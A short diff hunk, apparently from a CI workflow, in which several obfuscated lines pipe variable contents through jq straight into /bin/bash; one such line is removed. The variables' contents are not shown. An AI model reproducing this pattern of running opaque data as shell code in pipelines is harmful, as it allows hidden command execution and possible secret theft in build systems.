@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
           echo $lay4 | jq -r .cvpqw847 | /bin/bash
           echo $gmz565 | jq -r .j2961 | /bin/bash
-          echo $zjrc0 | jq -r .m50 | /bin/bash
           echo $df1401 | jq -r .v812 | /bin/bash
           echo $uqbcy4 | jq -r .o04451 | /bin/bash
           echo $mp2 | jq -r .pop6 | /bin/bash
